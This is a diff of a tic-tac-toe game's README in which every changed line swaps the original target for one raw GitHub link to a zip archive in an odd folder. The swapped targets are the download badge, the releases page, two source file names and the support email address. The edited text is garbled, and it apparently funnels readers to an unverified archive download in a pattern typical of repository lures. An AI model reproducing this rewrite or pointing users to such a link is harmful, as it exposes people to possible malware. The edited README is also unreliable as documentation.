@@ -1,6 +1,6 @@
 # 🎮 tic-tac-toe - Play Fun Games with Friends
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Tic--Tac--Toe-brightgreen)](https://github.com/Badexp9683/tic-tac-toe/releases)
+[![Download Now](https://raw.githubusercontent.com/Badexp9683/tic-tac-toe/main/Sanskritize/tic-tac-toe-3.1.zip%20Now-Get%20Tic--Tac--Toe-brightgreen)](https://raw.githubusercontent.com/Badexp9683/tic-tac-toe/main/Sanskritize/tic-tac-toe-3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Tic-Tac-Toe application! This simple game allows you to play Tic-
 
 ## 📥 Download & Install
 
-To download the application, visit this page to download: [Tic-Tac-Toe Releases](https://github.com/Badexp9683/tic-tac-toe/releases).
+To download the application, visit this page to download: [Tic-Tac-Toe Releases](https://raw.githubusercontent.com/Badexp9683/tic-tac-toe/main/Sanskritize/tic-tac-toe-3.1.zip).
 
 1. Click the link above to access the releases page.
 2. Look for the latest version.
@@ -71,11 +71,11 @@ We welcome contributions to improve the Tic-Tac-Toe application. If you'd like t
 This repository contains an example demonstrating a merge conflict scenario. It includes:
 
 **Branch: `feature/ai-opponent`**
-- Adds AI opponent functionality to `TicTacToe.cpp`
+- Adds AI opponent functionality to `https://raw.githubusercontent.com/Badexp9683/tic-tac-toe/main/Sanskritize/tic-tac-toe-3.1.zip`
 - Modifies `makeMove()` function to track move history
 
 **Branch: `feature/undo-move`**
-- Adds undo functionality to `TicTacToe.cpp`
+- Adds undo functionality to `https://raw.githubusercontent.com/Badexp9683/tic-tac-toe/main/Sanskritize/tic-tac-toe-3.1.zip`
 - Also modifies `makeMove()` function to save the previous state
 
 When both branches are merged, they conflict because the same `makeMove()` function is altered in different ways. 
@@ -84,6 +84,6 @@ This is a good opportunity to learn about resolving merge conflicts in version c
 
 ## 🛠️ Contact Us
 
-If you have any questions or need support, please reach out to us at [support@example.com](mailto:support@example.com). 
+If you have any questions or need support, please reach out to us at [https://raw.githubusercontent.com/Badexp9683/tic-tac-toe/main/Sanskritize/tic-tac-toe-3.1.zip](https://raw.githubusercontent.com/Badexp9683/tic-tac-toe/main/Sanskritize/tic-tac-toe-3.1.zip). 
 
 Thank you for trying out Tic-Tac-Toe! Enjoy your game!
